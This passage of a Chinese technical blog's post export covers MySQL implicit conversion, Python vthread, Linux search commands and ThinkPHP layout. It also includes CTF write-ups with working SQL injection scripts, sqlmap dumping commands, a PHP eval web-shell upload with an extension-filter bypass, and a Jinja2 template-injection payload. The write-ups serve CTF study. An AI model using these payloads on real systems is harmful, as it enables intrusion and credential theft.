&#x27;55aaa&#x27; = 55;+--------------+| &#x27;55aaa&#x27; = 55 |+--------------+| 1 |+--------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &#x27;a&#x27; + &#x27;55&#x27;;+------------+| &#x27;a&#x27; + &#x27;55&#x27; |+------------+| 55 |+------------+1 row in set, 1 warning (0.00 sec) 下面通过一些例子来复习一下上面的转换规则： 1234567891011121314151617181920212223mysql&gt; select 1+1;+-----+| 1+1 |+-----+| 2 |+-----+1 row in set (0.00 sec)mysql&gt; select &#x27;aa&#x27; + 1;+----------+| &#x27;aa&#x27; + 1 |+----------+| 1 |+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; show warnings;+---------+------+----------------------------------------+| Level | Code | Message |+---------+------+----------------------------------------+| Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;aa&#x27; |+---------+------+----------------------------------------+1 row in set (0.00 sec) 把字符串“aa”和1进行求和，得到1，因为“aa”和数字1的类型不同，MySQL官方文档告诉我们： When an operator is used with operands of different types, type conversion occurs to make the operands compatible. 查看warnings可以看到隐式转化把字符串转为了double类型。但是因为字符串是非数字型的，所以就会被转换为0，因此最终计算的是0+1=1 上面的例子是类型不同，所以出现了隐式转化，那么如果我们使用相同类型的值进行运算呢？ 12345678910111213141516mysql&gt; select &#x27;a&#x27; + &#x27;b&#x27;;+-----------+| &#x27;a&#x27; + &#x27;b&#x27; |+-----------+| 0 |+-----------+1 row in set, 2 warnings (0.00 sec)mysql&gt; show warnings;+---------+------+---------------------------------------+| Level | Code | Message |+---------+------+---------------------------------------+| Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;a&#x27; || Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;b&#x27; |+---------+------+---------------------------------------+2 rows in set (0.00 sec) 是不是有点郁闷呢？ 之所以出现这种情况，是因为+为算术操作符arithmetic operator 这样就可以解释为什么a和b都转换为double了。因为转换之后其实就是：0+0=0了。 在看一个例子： 1234567891011121314151617mysql&gt; select &#x27;a&#x27;+&#x27;b&#x27;=&#x27;c&#x27;;+-------------+| &#x27;a&#x27;+&#x27;b&#x27;=&#x27;c&#x27; |+-------------+| 1 |+-------------+1 row in set, 3 warnings (0.00 sec)mysql&gt; show warnings;+---------+------+---------------------------------------+| Level | Code | Message |+---------+------+---------------------------------------+| Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;a&#x27; || Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;b&#x27; || Warning | 1292 | Truncated incorrect DOUBLE value: &#x27;c&#x27; |+---------+------+---------------------------------------+3 rows in set (0.00 sec) 现在就看也很好的理解上面的例子了吧。a+b=c结果为1，1在MySQL中可以理解为TRUE，因为'a'+'b'的结果为0，c也会隐式转化为0，因此比较其实是：0=0也就是true，也就是1. 第二个需要注意点就是防止多查询或者删除数据 1234567891011121314151617181920212223242526272829mysql&gt; select * from test;+----+-------+-----------+| id | name | password |+----+-------+-----------+| 1 | test1 | password1 || 2 | test2 | password2 || 3 | aaa | aaaa || 4 | 55aaa | 55aaaa || 5 | 1212 | aaa || 6 | 1212a | aaa |+----+-------+-----------+6 rows in set (0.00 sec)mysql&gt; select * from test where name = 1212;+----+-------+----------+| id | name | password |+----+-------+----------+| 5 | 1212 | aaa || 6 | 1212a | aaa |+----+-------+----------+2 rows in set, 5 warnings (0.00 sec)mysql&gt; select * from test where name = &#x27;1212&#x27;;+----+------+----------+| id | name | password |+----+------+----------+| 5 | 1212 | aaa |+----+------+----------+1 row in set (0.00 sec) 上面的例子本意是查询id为5的那一条记录，结果把id为6的那一条也查询出来了。我想说明什么情况呢？有时候我们的数据库表中的一些列是varchar类型，但是存储的值为‘1123’这种的纯数字的字符串值，一些同学写sql的时候又不习惯加引号。这样当进行select，update或者delete的时候就可能会多操作一些数据。所以应该加引号的地方别忘记了。 关于字符串转数字的一些说明 123456789101112131415161718192021222324252627282930313233343536373839mysql&gt; select &#x27;a&#x27; = 0;+---------+| &#x27;a&#x27; = 0 |+---------+| 1 |+---------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &#x27;1a&#x27; = 1;+----------+| &#x27;1a&#x27; = 1 |+----------+| 1 |+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &#x27;1a1b&#x27; = 1;+------------+| &#x27;1a1b&#x27; = 1 |+------------+| 1 |+------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &#x27;1a2b3&#x27; = 1;+-------------+| &#x27;1a2b3&#x27; = 1 |+-------------+| 1 |+-------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select &#x27;a1b2c3&#x27; = 0;+--------------+| &#x27;a1b2c3&#x27; = 0 |+--------------+| 1 |+--------------+1 row in set, 1 warning (0.00 sec) 从上面的例子可以看出，当把字符串转为数字的时候，其实是从左边开始处理的。 如果字符串的第一个字符就是非数字的字符，那么转换为数字就是0 如果字符串以数字开头 如果字符串中都是数字，那么转换为数字就是整个字符串对应的数字 如果字符串中存在非数字，那么转换为的数字就是开头的那些数字对应的值 如果你有其他更好的例子，或者被隐式转化坑过的情况，欢迎分享。 参考资料 http://dev.mysql.com/doc/refman/5.7/en/cast-functions.html https://blog.eood.cn/mysql_params http://dev.mysql.com/doc/refman/5.7/en/type-conversion.html"},{"title":"Python多线程-Vthread","date":"2020-03-19","updated":"2024-03-19","path":"2020/03/19/Python多线程-Vthread/","text":"0x01 安装vthread函数库 系统命令行下执行: pip install vthread 0x02 一句话实现简单多线程 1234567891011import vthread,requests@vthread.thread(5) #开5个线程执行同一个函数def compete(url): r = requests.get(url) if r.status_code == 200 : print(&quot;[*]Success&quot;) else: print(&quot;[*]Fail. Retrying...&quot;)compete(&quot;http://www.baidu.com/&quot;) 相同效果： 123456789101112import vthread,requests@vthread.threaddef compete(url): r = requests.get(url) if r.status_code == 200 : print(&quot;[*]Success&quot;) else: print(&quot;[*]Fail. Retrying...&quot;)for i in range(5): #线程数 compete(&quot;http://www.baidu.com/&quot;) 0x03 线程池包装 123456789101112import vthread,requests@vthread.pool(10) #包装10条线程池def compete(url): r = requests.get(url) if r.status_code == 200 : print(&quot;[*]Success&quot;) else: print(&quot;[*]Fail. Retrying...&quot;)for i in range(20): #20线程 compete(&quot;http://www.baidu.com/&quot;) 线程池（核心功能） 不加装饰器就是普通的单线程，只用加一行就能在不破坏原来的结构直接实现线程池操作，能进行参数传递，支持分组，这已经到了不破坏代码的极限了。 12345678910111213141516171819202122232425import timeimport vthread@vthread.pool(6) # 只用加这一行就能实现6条线程池的包装def foolfunc(num): time.sleep(1) print(f&quot;foolstring, test2 foolnumb: &#123;num&#125;&quot;)for i in range(10): foolfunc(i) # 加入装饰器后，这个函数变成往伺服线程队列里塞原函数的函数了# 不加装饰就是普通的单线程# 只用加一行就能不破坏原来的代码结构直接实现线程池操作，能进行参数传递执行效果如下：[ Thread-1 ] foolstring, test2 foolnumb: 0[ Thread-5 ] foolstring, test2 foolnumb: 4[ Thread-2 ] foolstring, test2 foolnumb: 2[ Thread-6 ] foolstring, test2 foolnumb: 5[ Thread-4 ] foolstring, test2 foolnumb: 3[ Thread-3 ] foolstring, test2 foolnumb: 1[ Thread-1 ] foolstring, test2 foolnumb: 6[ Thread-5 ] foolstring, test2 foolnumb: 7[ Thread-2 ] foolstring, test2 foolnumb: 8[ Thread-6 ] foolstring, test2 foolnumb: 9 支持分组线程池 如果你想要让你的某几个函数有M个线程执行，而另外几个函数要N个线程去执行。 那么请看看下面的使用说明 12345678910111213141516171819202122232425import timeimport vthreadpool_1 = vthread.pool(5,gqueue=1) # 开5个伺服线程，组名为1pool_2 = vthread.pool(2,gqueue=2) # 开2个伺服线程，组名为2@pool_1def foolfunc1(num): time.sleep(1) print(f&quot;foolstring1, test3 foolnumb1:&#123;num&#125;&quot;)@pool_2 # foolfunc2 和 foolfunc3 用gqueue=2的线程池def foolfunc2(num): time.sleep(1) print(f&quot;foolstring2, test3 foolnumb2:&#123;num&#125;&quot;)@pool_2 # foolfunc2 和 foolfunc3 用gqueue=2的线程池def foolfunc3(num): time.sleep(1) print(f&quot;foolstring3, test3 foolnumb3:&#123;num&#125;&quot;)for i in range(10): foolfunc1(i)for i in range(10): foolfunc2(i) for i in range(10): foolfunc3(i)# 额外开启线程池组的话最好不要用gqueue=0# 因为gqueue=0就是默认参数 原子封装 如果需要考虑对函数内的某些步骤进行锁的操作，那么请看下面的使用说明。 123456789101112131415161718# 有时候你需要把某些操作进行原子化# 可以把你要原子化的操作写成函数，用vthread.atom装饰就行import timeimport vthread@vthread.thread(5)def foolfunc_(): @vthread.atom # 将函数加锁封装 def do_some_fool_thing1(): pass # do_something @vthread.atom # 将函数加锁封装 def do_some_fool_thing2(): pass # do_something # 执行时就会实现原子操作 do_some_fool_thing1() do_some_fool_thing2() 额外说明 12345678910111213141516171819202122232425262728# 另外：# 为了便于调试函数在任意第一次装饰过后会对 print 打猴子补丁# 自带的 print 函数变成带锁的函数了，还加了些打印线程名字的操作# 可以通过 vthread.toggle 函数对这些或其他一些功能进行关闭# 也可以用 vthread.unpatch_all() 直接将 print 还原成系统默认函数# 更多详细内容可以 help(vthread)# 额外细节：# 如果想将自己的某些函数进行原子操作的封装可以考虑用 @vthread.atom 装饰那个函数# 如果你想用原函数的话，你可以用 vthread.orig_func[&quot;foolfunc1&quot;] 获得原函数地址# vthread.orig_func 就是一个包装【原函数名字】对应【原函数地址】的字典。# 虽然 vthread.atom 可以实现原子操作# 这里仍然将 lock 暴露出去，用 vthread.lock 就可以拿到这个唯一的线程锁实体# 可以用 vthread.pool.show 方法来查看线程池数量情况。# 为了不用使用者收尾：# 当使用者装饰任意数量的线程池的时候，都会默认只开一个不计入数量的线程MainMonitor# 就是监视主线程执行情况，一旦主线程执行完，同时所有线程池函数处于伺服状态就向线程队列注入相应数量的停止标记# 需要两个条件：# 1. 主线程执行完毕# 因为该线程池的原理就是让主线程变成派发函数的进程，执行到尾部自然就代表# 分配的任务已经分配完了，这时就可以注入停止标记让线程执行完就赶紧结束掉# 2. 每个函数都处于等待获取函数参数状态（即保证函数执行完毕）# 当线程内嵌套其他分组的线程池函数的时，被嵌套的函数在之前是有可能不执行的# 所以就设计了条件2，以确保所有需要分发的函数能够全部分发完成且执行完毕# 因为是队列操作不会影响线程效率，MainMonitor线程只是为了防止在命令行下控制权不交还的情况。# 当然在之前设计的时候是可以用人为等所有代码执行完毕最后执行一次 vthread.pool.close_all() 即可解决。# 但是为了更易用，为了不让使用者在代码最后添加这一句话，就设计了这个监控线程 另外强调的困惑 假如在使用过程中装饰了多个函数会怎么计算线程池的线程数量呢？ 这里给出了说明，在 vthread.pool 函数库中，是以 gqueue 这个参数来确定线程池分组的。 而相同的分组，则会默认使用最后一个 “人为定义” 的伺服线程数量。 1234567891011121314151617181920212223242526272829303132333435363738394041#==============================================## ## 注意！关于多个函数装饰器，线程池数量的定义 ## ##==============================================## eg.1@vthread.pool(10)def foolfunc1(): pass@vthread.pool(18)def foolfunc1(): pass# 这样就意味着gqueue=0的线程池数量为18# eg.2@vthread.pool(10)def foolfunc1(): pass@vthread.pool()def foolfunc1(): pass# 这样就意味着gqueue=0的线程池数量为10# eg.3@vthread.pool()def foolfunc1(): pass@vthread.pool()def foolfunc1(): pass这样就意味着gqueue=0的线程池数量为默认的cpu核心数# eg.4pool1 = vthread.pool(gqueue=1)pool2 = vthread.pool(6,gqueue=2)pool2 = vthread.pool(8,gqueue=2)# 这样就意味着gqueue=1的线程池数量为默认的cpu核心数，gqueue=2的线程池数量为8 普通的多线程 考虑到函数库的多用性，可能是觉得这种直接粗暴的开启多线程函数的测试需求比较常见，所以会保留有这样的一个功能。 1234567891011121314151617181920212223242526272829303132333435import timeimport vthread@vthread.thread(5) # 只要这一行就能让函数变成开5个线程执行同个函数def foolfunc(num): time.sleep(1) print(f&quot;foolstring, test1 foolnumb: &#123;num&#125;&quot;)foolfunc(123) # 加入装饰器后，这个函数就变成了开5个线程执行的函数了# 考虑到函数库的易用性，个人觉得这种直接粗暴的开启多线程函数的测试需求比较常见# 所以才保留了这样的一个功能。执行效果如下：[ Thread-1 ] foolstring, test1 foolnumb: 123[ Thread-2 ] foolstring, test1 foolnumb: 123[ Thread-3 ] foolstring, test1 foolnumb: 123[ Thread-4 ] foolstring, test1 foolnumb: 123[ Thread-5 ] foolstring, test1 foolnumb: 123# 为了使函数执行更独立（方便参数传递）可以用 vthread.thread(1) 来装饰# 但是为了使用更为简便 这里的 vthread.thread 等同于 vthread.thread(1)@vthread.thread def foolfunc(num): time.sleep(1) print(f&quot;foolstring, test1 foolnumb: &#123;num&#125;&quot;)for i in range(5): foolfunc(123) # 执行与数量分离，可以使得参数传递更为动态执行效果同上# 注意：# vthread.thread 不带参数的方式只能装饰一个函数，装饰多个函数会出现问题，仅用于测试单个函数。# vthread.thread(1) 带参数的可以装饰多个函数，但是已经有了分组线程池的强大功能，为什么还要这样浪费资源呢？"},{"title":"XCTF4th","date":"2020-03-19","updated":"2024-03-19","path":"2020/03/19/XCTF4th-CyberEarth/","text":"ics-02 扫描有secret目录， 无法直接进入secret_debug.php 显示ip不对 点paper会向download.php传参,可以下载一个ssrf内容的pdf, 于是想到利用ssrf来访问secret_debug.php 发现参数s,fuzz一下,发现s=3时会有如下返回 输入这么多个字段注册。注册成功后会把其中一部分字段返回，猜测后台逻辑应该是: 1234567INSERT INTO Persons VALUES ($textfirst_name, $textmiddle_name, $texLast_name, $textname_suffix, $textdob, $textdl_nmber, $textRetypeDL) 注册后，将txtfirst_name $textast_name $txtdob,显示出来，注入思路就是注释掉中间一部分字段就好了 12345678910&quot;txtfirst_name&quot;: &quot;L&#x27;,&#x27;1&#x27;,(&quot;+subquery+&quot;),&#x27;1&#x27;/*&quot;,&quot;txtmiddle_name&quot;: &quot;m&quot;,&quot;txtLast_name&quot;: &quot;y&quot;,&quot;txtname_suffix&quot;: &quot;Esq.&quot;,&quot;txtdob&quot;: &quot;*/,&#x27;01/10/2019&quot;,&quot;txtdl_nmbr&quot;: id,&quot;txtRetypeDL&quot;: idINSERT INTO Persons VALUES (&quot;L&#x27;,&#x27;1&#x27;,(&quot;+payload+&quot;),&#x27;1&#x27;/*&quot;,&quot;m&quot;,&quot;y&quot;,&quot;Esq.&quot;,&quot;*/,&#x27;01/10/2019&quot;,id,id) payload 123456789101112131415161718192021222324252627282930313233import requestsimport randomimport urlliburl = &#x27;http://111.198.29.45:52536/download.php&#x27;# subquery = &quot;database()&quot;# ssrfw# subquery = &quot;select table_name from information_schema.tables where table_schema=&#x27;ssrfw&#x27; LIMIT 1&quot;# cetcYssrf# subquery = &quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; LIMIT 1&quot;# secretname -&gt; flag# subquery = &quot;select column_name from information_schema.columns where table_name=&#x27;cetcYssrf&#x27; LIMIT 1, 1&quot;# value -&gt; flag&#123;cpg9ssnu_OOOOe333eetc_2018&#125;subquery = &quot;select value from cetcYssrf LIMIT 1&quot;id = random.randint(1, 10000000)d = (&#x27;http://127.0.0.1/secret/secret_debug.php?&#x27; + urllib.parse.urlencode(&#123; &quot;s&quot;: &quot;3&quot;, &quot;txtfirst_name&quot;: &quot;L&#x27;,&#x27;1&#x27;,(&quot;+subquery+&quot;),&#x27;1&#x27;/*&quot;, &quot;txtmiddle_name&quot;: &quot;m&quot;, &quot;txtLast_name&quot;: &quot;y&quot;, &quot;txtname_suffix&quot;: &quot;Esq.&quot;, &quot;txtdob&quot;: &quot;*/,&#x27;01/10/2019&quot;, &quot;txtdl_nmbr&quot;: id, &quot;txtRetypeDL&quot;: id &#125;) + &quot;&amp;&quot;)r = requests.get(url, params=&#123;&quot;dl&quot;: d&#125;)print(r.text) ics-04 注册用户，登录，修改密码 在这几个页面fuzz，发现login页面输入什么都可以登录然后显示普通用户登录没啥用，应该就是个提示而已 继续fuzz发现找回密码处存在注入 输入1' or 1=1#,进入密码修改页面 输入1' or 1=0#，提示没有此用户 可以推断出这里是bool盲注，且fuzz时没有发现有什么过滤 手动 12345678910111213141516order by测试发现有四个字段1&#x27; or 1=1 order by 4#找出所有的数据库&#x27; union select 1,2,group_concat(schema_name),4 from information_schema.schemata;#information_schema, : cetc004, : mysql, : performance_schema爆cetc004数据库&#x27; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=&#x27;cetc004&#x27; and table_name=&#x27;user&#x27;;#: username, : password, : question, : answer找用户名密码&#x27; union select 1,2,group_concat(username),4 from cetc004.user;#c3tlwDmIn23,c3tlwDmIn23&#x27; union select 1,2,group_concat(password),4 from cetc004.user;#2f8667f381ff50ced6a3edc259260ba9,21232f297a57a5a743894a0e4a801fc3 密码是被hash过的，但是注册页面可以注册同名用户，注册一个这个名字 登录就好了 通过观察重置密码的http请求，发现总共是3个请求，而且不同用户名的cookie是不变的，猜测使用会话实现重置密码的功能，而会话是与用户名绑定的，因此我们可以构造一个SQL语句，使得查询出来的用户名是管理员的用户名，但是密保问题和答案是我们自己指定的，就可以成功重置密码了：' union select 'c3tlwDmIn23','202cb962ac59075b964b07152d234b70','随意设置的问题','answer123333';# sqlmap跑 sqlmap跑的是时间盲注入，可能慢一点 sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; 1234567891011sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:---Parameter: username (POST) Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=1&#x27; AND (SELECT 5762 FROM (SELECT(SLEEP(5)))yWIL) AND &#x27;ENSj&#x27;=&#x27;ENSj Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: username=1&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x717a7a7a71,0x6c696648426256635a6c48454d56585870536a777351674553657047484f6c665654436558636557,0x7178787171),NULL-- qBMW--- sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; --dbs 12345available databases [4]: [*] cetc004[*] information_schema[*] mysql[*] performance_schema sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 --tables 1234[1 table]+------+| user |+------+ sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user --columns 1234567891011Database: cetc004 Table: user[4 columns]+----------+--------------+| Column | Type |+----------+--------------+| answer | varchar(255) || password | varchar(255) || question | varchar(255) || username | varchar(255) |+----------+--------------+ sqlmap -u &quot;http://111.198.29.45:53416/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user -C &quot;username,password&quot; --dump 12345678Database: cetc004Table: user[1 entry]+-------------+----------------------------------+| username | password |+-------------+----------------------------------+| c3tlwDmIn23 | 2f8667f381ff50ced6a3edc259260ba9 |+-------------+----------------------------------+ 被hash加密了,发现注册页面可以再次注册c3tlwDmIn23这个账号,成功重置密码,登入得到flag 加上–technique=T -v 3 就先看看sqlmap检测payload。 ics-07 在项目管理中有源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970 &lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;cetc7&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php session_start(); if (!isset($_GET[page])) &#123; show_source(__FILE__); die(); &#125; if (isset($_GET[page]) &amp;&amp; $_GET[page] != &#x27;index.php&#x27;) &#123; include(&#x27;flag.php&#x27;); &#125;else &#123; header(&#x27;Location: ?page=flag.php&#x27;); &#125; ?&gt; &lt;form action=&quot;#&quot; method=&quot;get&quot;&gt; page : &lt;input type=&quot;text&quot; name=&quot;page&quot; value=&quot;&quot;&gt; id : &lt;input type=&quot;text&quot; name=&quot;id&quot; value=&quot;&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;br /&gt; &lt;a href=&quot;index.phps&quot;&gt;view-source&lt;/a&gt; &lt;?php if ($_SESSION[&#x27;admin&#x27;]) &#123; $con = $_POST[&#x27;con&#x27;]; $file = $_POST[&#x27;file&#x27;]; $filename = &quot;backup/&quot;.$file; if(preg_match(&#x27;/.+\\.ph(p[3457]?|t|tml)$/i&#x27;, $filename))&#123; die(&quot;Bad file extension&quot;); &#125;else&#123; chdir(&#x27;uploaded&#x27;); $f = fopen($filename, &#x27;w&#x27;); fwrite($f, $con); fclose($f); &#125; &#125; ?&gt; &lt;?php if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== &#x27;1&#x27; &amp;&amp; substr($_GET[id], -1) === &#x27;9&#x27;) &#123; include &#x27;config.php&#x27;; $id = mysql_real_escape_string($_GET[id]); $sql=&quot;select * from cetc007.user where id=&#x27;$id&#x27;&quot;; $result = mysql_query($sql); $result = mysql_fetch_object($result); &#125; else &#123; $result = False; die(); &#125; if(!$result)die(&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;); if($result)&#123; echo &quot;id: &quot;.$result-&gt;id.&quot;&lt;/br&gt;&quot;; echo &quot;name:&quot;.$result-&gt;user.&quot;&lt;/br&gt;&quot;; $_SESSION[&#x27;admin&#x27;] = True; &#125; ?&gt; &lt;/body&gt;&lt;/html&gt; 审计第二部分php感觉应该数据库中只有一个id=1的数据，但是不能直接输入1,要绕过这个限制if (isset($_GET[id]) &amp;&amp; floatval($_GET[id]) !== '1' &amp;&amp; substr($_GET[id], -1) === '9'): ``floatval($_GET[id]) !== ‘1’,这个函数只截取数字部分，例如floatval(“123zxc”) = 123` mysql中存在隐式数据转换，例如1==&quot;1asd&quot; 构造id=1xx9&amp;page=flag.php,即可在数据库查询到id=1的数据 审计第一部分文件上传的地方，这里需要注意的3个点: $filename = &quot;backup/&quot;.$file;目录为假目录，需要绕过 if(preg_match('/.+\\.ph(p[3457]?|t|tml)$/i', $filename))有一个正则对文件后缀进行过滤 真实的上传目录为:uploaded 所以我们这里针对第一个点容易想到，$file加一个../即可绕过这个假目录 针对第二个点，容易发现，匹配只匹配最后一个点的后缀，所以可以引用比较经典的解析问题sky.php/.绕过 这个解析是和Linux目录结构特性有关的： 创建了一个目录为1.php , 在 1.php 下创建了一个子目录为 2.php 。Linux下每创建一个新目录 , 都会在其中自动创建两个隐藏文件。 其中 … 代表当前目录的父目录 , .代表当前目录 , 所以这里访问 ./1.php/2.php/… 代表访问 2.php的父目录 , 也就是访问 1.php 。 所以容易得到如下payload post数据 con=&lt;?php @eval($_POST['cmd']);?&gt;&amp;file=cmd.php/. 使用菜刀连接即可拿到shell https://blog.csdn.net/qq_45552960/article/details/102777514?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task"},{"title":"TokyoWesternsCTF2018","date":"2020-03-18","updated":"2024-03-19","path":"2020/03/18/TokyoWesternsCTF2018/","text":"shrine 进页面就有这段代码 123456789101112131415161718192021222324252627import flaskimport osapp = flask.Flask(__name__)app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)@app.route(&#x27;/&#x27;)def index(): return open(__file__).read()@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)def shrine(shrine): def safe_jinja(s): s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;) blacklist = [&#x27;config&#x27;, &#x27;self&#x27;] return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == &#x27;__main__&#x27;: app.run(debug=True) 1. If I can use config 1GET /shrine/&#123;&#123;config&#125;&#125; 2. If I can use self &#123;&#123;self&#125;&#125; ⇒ 1&#123;&#123;self.__dict__&#125;&#125; . Also, there are many things that can be used. url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config 3. If I can use ( and ) 1&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#x27;os&#x27;].__dict__.environ[&#x27;FLAG]&#125;&#125; 【method 1.Discover current_app in url_for 】 1&#123;&#123;url_for&#125;&#125; ↓ 1&lt;function url_for at 0x7f5cc8cd1f28&gt; 1&#123;&#123;url_for.__globals__&#125;&#125; 【method 2.Discover current_app in get_flashed_messages 】 1&#123;&#123;get_flashed_messages&#125;&#125; ↓ `` 1&#123;&#123;get_flashed_messages.__globals__&#125;&#125; 【exploit】 1GET /shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; or 1GET /shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125; ↓ 1TWCTF&#123;pray_f0r_sacred_jinja2&#125; https://ctftime.org/writeup/10895 https://www.colabug.com/2018/0908/4435040/"},{"title":"linux查找文件内容","date":"2020-03-18","updated":"2024-11-11","path":"2020/03/18/linux查找文件内容/","text":"ls命令 -R 递归（recursive）。该选项递归地列举所有目录（在当前目录之下）的内容。 -S 按大小排序 -s 在每个文件前面加上文件大小输出 -t 按时间排序 -F 文件类型（File type）。在每一个列举项目之后添加一个符号。这些符号包括： / 表明是一个目录； @ 表明是到其它文件的符号链接； * 表明是一个可执行文件 只显示目录 ls -F | grep &quot;/$&quot; 12345bin/build_dir/config/dl/docs/ ls -al | grep &quot;^d&quot; 123456drwxr-xr-x 17 cheng cheng 4096 6月 9 08:00 .drwxr-xr-x 9 root root 4096 6月 8 20:53 ..drwxr-xr-x 3 xxx xxx 4096 6月 9 07:13 bindrwxr-xr-x 5 xxx xxx 4096 6月 9 07:12 build_dirdrwxr-xr-x 2 xxx xxx 4096 6月 8 20:55 configdrwxr-xr-x 2 xxx xxx 4096 6月 9 08:20 dl 只显示文件 ls -al | grep &quot;^-&quot; 1234-rw-r--r-- 1 cheng cheng 179 6月 8 20:55 BSDmakefile-rw-rw-r-- 1 cheng cheng 162814 6月 9 07:11 .config-rw-r--r-- 1 cheng cheng 576 6月 8 20:55 Config.in-rw-rw-r-- 1 cheng cheng 161809 6月 9 07:10 .config.old xargs xargs 可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。 xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。 xargs 默认的命令是 echo，这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。 grep查找单一文件 grep &quot;被查找的字符串&quot; 文件名 例子：在当前目录里第一级文件夹中寻找包含指定字符串的.in文件 grep “thermcontact” */*.in 从文件内容查找与正则表达式匹配的行： grep –e “正则表达式” 文件名 查找时不区分大小写： grep –i &quot;被查找的字符串&quot; 文件名 查找匹配的行数： grep -c &quot;被查找的字符串&quot; 文件名 从文件内容查找不匹配指定字符串的行： grep –v &quot;被查找的字符串&quot; 文件名 find+ xargs+ grep 查找制定目录文件 从根目录开始查找所有扩展名为.log的文本文件，并找出包含”ERROR”的行 find / -type f -name &quot;\\*.log&quot; | xargs grep &quot;ERROR&quot; 从当前目录开始查找所有扩展名为.in的文本文件，并找出包含”thermcontact”的行 find . -name &quot;\\*.in&quot; | xargs grep &quot;thermcontact&quot; 批量替换 替换server.xml文件中的”2020”为”8008” sed -i 's/2020/8080/g' ./conf/server.xml 批量替换，替换server.xml文件中的”2020”为”8008”，将结果输出到result1.xml sed -i 's/2020/8080/g' ./conf/server.xml &gt; result1.xml 查找文件名中不包含指定字符串文件 1find . ! -name &#x27;*string*&#x27; 打印包含指定字符串文件的路径 1find public -type f |xargs grep -nl &#x27;string&#x27; find查找时排除指定目录 1find . -type f ! -path &quot;./source*&quot; ! -path &quot;./db*&quot; Windows查找 findstr.exe /s /i &quot;string&quot; *.* 上面的命令表示，当前目录以及当前目录的所有子目录下的所有文件中查找&quot;string&quot;这个字符串。 *.*表示所有类型的文件。 /s 表示当前目录以及所有子目录 /i 表示不区分大小写"},{"title":"Bless-Hex-Editor保存错误","date":"2020-03-17","updated":"2024-03-19","path":"2020/03/17/Bless-Hex-Editor保存错误/","text":"问题描述 解决方法 打开~/.config/bless/preferences.xml 添加 &lt;pref name=&quot;ByteBuffer.TempDir&quot;&gt;/tmp&lt;/pref&gt;"},{"title":"thinkphp项目结构","date":"2020-03-17","updated":"2024-03-19","path":"2020/03/17/thinkphp项目结构/","text":"目录结构 https://www.kancloud.cn/manual/thinkphp5/118008 安装后可以看到下面的目录结构 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859www WEB部署目录(fleastrTest）├─application 应用目录│ ├─common 公共模块目录（可以更改）│ ├─module_name 模块目录│ │ ├─common.php 模块函数文件│ │ ├─controller 控制器目录│ │ ├─model 模型目录│ │ ├─view 视图目录│ │ ├─config 配置目录│ │ └─ … 更多类库目录│ ││ ├─command.php 命令行定义文件│ ├─common.php 公共函数文件│ └─tags.php 应用行为扩展定义文件│├─config 应用配置目录│ ├─module_name 模块配置目录│ │ ├─database.php 数据库配置│ │ ├─cache 缓存配置│ │ └─ …│ ││ ├─app.php 应用配置│ ├─cache.php 缓存配置│ ├─cookie.php Cookie配置│ ├─database.php 数据库配置│ ├─log.php 日志配置│ ├─session.php Session配置│ ├─template.php 模板引擎配置│ └─trace.php Trace配置│├─route 路由定义目录│ ├─route.php 路由定义│ └─… 更多│├─public WEB目录（对外访问目录）│ ├─index.php 入口文件│ ├─router.php 快速测试文件│ └─.htaccess 用于apache的重写│├─thinkphp 框架系统目录│ ├─lang 语言文件目录│ ├─library 框架类库目录│ │ ├─think Think类库包目录│ │ └─traits 系统Trait目录│ ││ ├─tpl 系统模板目录│ ├─base.php 基础定义文件│ ├─convention.php 框架惯例配置文件│ ├─helper.php 助手函数文件│ 